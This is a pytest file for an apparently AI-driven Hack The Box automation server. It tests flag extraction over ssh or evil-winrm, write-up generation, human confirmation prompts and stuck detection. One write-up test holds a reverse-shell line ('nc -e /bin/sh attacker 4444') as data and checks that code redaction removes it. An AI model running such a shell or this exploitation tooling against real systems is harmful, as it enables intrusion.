"""Tests for kestrel.mcp.tools.{flag,writeup,hitl,heartbeat}."""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest

from kestrel.mcp import context as mcp_context
from kestrel.mcp.tools import flag as flag_tools
from kestrel.mcp.tools import heartbeat as hb_tools
from kestrel.mcp.tools import hitl as hitl_tools
from kestrel.mcp.tools import state as state_tools
from kestrel.mcp.tools import writeup as writeup_tools
from kestrel.transport.base import ExecResult


@pytest.fixture
def fresh_ctx(tmp_path: Path):
    mcp_context.reset_context()
    ctx = mcp_context.ServerContext.from_paths(
        state_dir=tmp_path / "state",
        session_root=tmp_path / "sessions",
    )
    mcp_context.set_context(ctx)
    asyncio.run(
        state_tools.state_write_machine(
            machine="lame", patch={"machine_id": 1, "session_slug": "htb-test-lame"}
        )
    )
    yield ctx
    mcp_context.reset_context()


@pytest.fixture
def mock_via_kali_flag(monkeypatch):
    calls: list[tuple[str, float]] = []
    return_value = {"result_u": ExecResult(stdout="", stderr="", rc=0, duration_s=0.1),
                    "result_r": ExecResult(stdout="", stderr="", rc=0, duration_s=0.1),
                    "next": 0}

    def fake(cmd: str, timeout: float = 120.0, **kwargs):
        calls.append((cmd, timeout))
        # Return user_res first call, root_res second call
        which = "result_u" if return_value["next"] == 0 else "result_r"
        return_value["next"] = 1 - return_value["next"]
        return return_value[which]

    monkeypatch.setattr("kestrel.mcp.tools.flag.kali_proxy.via_kali", fake)
    return {"calls": calls, "return": return_value}


# ════════════════════════════════════════════════════════════════════════════
# flag
# ════════════════════════════════════════════════════════════════════════════


def test_flag_extract_linux_finds_both(fresh_ctx, mock_via_kali_flag):
    mock_via_kali_flag["return"]["result_u"] = ExecResult(
        stdout="abcd" * 8, stderr="", rc=0, duration_s=0.1
    )
    mock_via_kali_flag["return"]["result_r"] = ExecResult(
        stdout="1234abcd" * 4, stderr="", rc=0, duration_s=0.1
    )
    result = asyncio.run(flag_tools.flag_extract(exec_cmd_template="ssh u@h '{}'", os="linux"))
    assert result["user_flag"] == ("abcd" * 8)
    assert result["root_flag"] == ("1234abcd" * 4)


def test_flag_extract_windows_cmd_paths(fresh_ctx, mock_via_kali_flag):
    asyncio.run(flag_tools.flag_extract(exec_cmd_template="evil-winrm '{}'", os="windows"))
    user_cmd = mock_via_kali_flag["calls"][0][0]
    root_cmd = mock_via_kali_flag["calls"][1][0]
    assert "Desktop" in user_cmd
    assert "Administrator" in root_cmd


def test_flag_validate_valid():
    result = asyncio.run(flag_tools.flag_validate(flag="abcdef0123456789abcdef0123456789"))
    assert result["valid"] is True


def test_flag_validate_invalid_length():
    result = asyncio.run(flag_tools.flag_validate(flag="abc"))
    assert result["valid"] is False


def test_flag_validate_strips_quotes():
    result = asyncio.run(flag_tools.flag_validate(flag='"abcdef0123456789abcdef0123456789"'))
    assert result["valid"] is True


# ════════════════════════════════════════════════════════════════════════════
# writeup
# ════════════════════════════════════════════════════════════════════════════


def test_writeup_generate_writes_md(fresh_ctx):
    result = asyncio.run(
        writeup_tools.writeup_generate(
            machine="lame",
            sections={
                "summary": "Easy Linux box.",
                "recon": "Samba 3.0.20.",
                "foothold": "usermap_script.",
                "privesc": "Foothold root.",
                "lessons": "Always check Samba version.",
            },
            flags={"user": "userhash", "root": "roothash"},
            os="Linux",
            difficulty="Easy",
            ip="10.10.10.3",
        )
    )
    path = Path(result["writeup_path"])
    assert path.exists()
    text = path.read_text(encoding="utf-8")
    assert "# Write-up — lame" in text
    assert "userhash" in text
    assert "Samba 3.0.20." in text


def test_writeup_kb_synthesize_strips_code_blocks(fresh_ctx):
    asyncio.run(
        writeup_tools.writeup_generate(
            machine="lame",
            sections={"summary": "Lame box.\n```bash\nnc -e /bin/sh attacker 4444\n```\nDone."},
            flags={"user": "x", "root": "y"},
        )
    )
    result = asyncio.run(writeup_tools.writeup_kb_synthesize(machine="lame", kb_staging_dir=str(fresh_ctx.state_dir / "kb-stage")))
    assert "kb_path" in result
    kb_text = Path(result["kb_path"]).read_text(encoding="utf-8")
    assert "nc -e" not in kb_text
    assert "code redacted" in kb_text


def test_writeup_kb_synthesize_missing_writeup(fresh_ctx):
    result = asyncio.run(writeup_tools.writeup_kb_synthesize(machine="ghost", kb_staging_dir=str(fresh_ctx.state_dir / "kb-stage")))
    assert result["error"] == "writeup_not_found"


def test_writeup_publish_hint_missing_script(fresh_ctx, monkeypatch):
    monkeypatch.setenv("KESTREL_PUBLISH_EMIT", "/nonexistent/emit.py")
    result = asyncio.run(writeup_tools.writeup_publish_hint(machine="lame"))
    assert result["error"] == "emit_script_not_found"


# ════════════════════════════════════════════════════════════════════════════
# hitl
# ════════════════════════════════════════════════════════════════════════════


def test_hitl_returns_marker_with_defaults():
    result = asyncio.run(
        hitl_tools.request_user_confirmation(question="Submit flag for Lame?")
    )
    assert result["_hitl"] is True
    assert result["question"] == "Submit flag for Lame?"
    assert result["options"] == ["yes", "no"]


def test_hitl_custom_options_and_context():
    result = asyncio.run(
        hitl_tools.request_user_confirmation(
            question="Pick exploit vector",
            options=["samba_usermap", "ms17-010", "default-creds"],
            context="Samba 3.0.20 + 445/139 open",
        )
    )
    assert result["options"] == ["samba_usermap", "ms17-010", "default-creds"]
    assert "Samba 3.0.20" in result["context"]


# ════════════════════════════════════════════════════════════════════════════
# heartbeat / stuck
# ════════════════════════════════════════════════════════════════════════════


def test_stuck_check_no_signals_when_empty_session(fresh_ctx):
    result = asyncio.run(hb_tools.stuck_check(machine="lame"))
    # Empty session → no detection signals
    assert result["recommendation"] in ("continue", "switch_vector", "switch_vpn_server")
    assert isinstance(result["signals"], list)


def test_stuck_check_shell_lost_signal(fresh_ctx):
    session_dir = Path(fresh_ctx.session_root) / "htb-test-lame"
    session_dir.mkdir(parents=True, exist_ok=True)
    (session_dir / "estado.md").write_text(
        "📡 connection refused on listener\n💡 shell died\n", encoding="utf-8"
    )
    (session_dir / "findings.md").write_text("Note: connection lost.\n", encoding="utf-8")
    result = asyncio.run(hb_tools.stuck_check(machine="lame"))
    assert "shell_lost" in result["signals"]
    assert result["recommendation"] == "reset_listener"


def test_stuck_check_rabbit_hole_signal(fresh_ctx):
    """V09-D2: stuck_check must include rabbit_hole detection (was missing)."""
    import json
    from datetime import datetime, timezone
    session_dir = Path(fresh_ctx.session_root) / "htb-test-lame"
    session_dir.mkdir(parents=True, exist_ok=True)
    now = datetime.now(timezone.utc)
    repeated_event = {
        "ts": now.isoformat(),
        "event": "narrate",
        "stream": "🔍",
        "detail": "gobuster no encuentra nada interesante en /api",
    }
    jsonl_lines = [repeated_event] * 4
    (session_dir / "sessions.jsonl").write_text(
        "\n".join(json.dumps(e) for e in jsonl_lines) + "\n", encoding="utf-8"
    )
    (session_dir / "estado.md").write_text("probando dirfuzz varias veces", encoding="utf-8")
    result = asyncio.run(hb_tools.stuck_check(machine="lame"))
    assert "rabbit_hole" in result["signals"]
    assert result["recommendation"] == "switch_vector"


def test_heartbeat_status_returns_dashboard_shape(fresh_ctx):
    session_dir = Path(fresh_ctx.session_root) / "htb-test-lame"
    session_dir.mkdir(parents=True, exist_ok=True)
    result = asyncio.run(hb_tools.heartbeat_status(machine="lame"))
    # Expected dashboard keys
    for key in ("session_dir", "events_count", "elapsed_min", "budget_min", "ts", "current_phase"):
        assert key in result, f"missing key {key}"
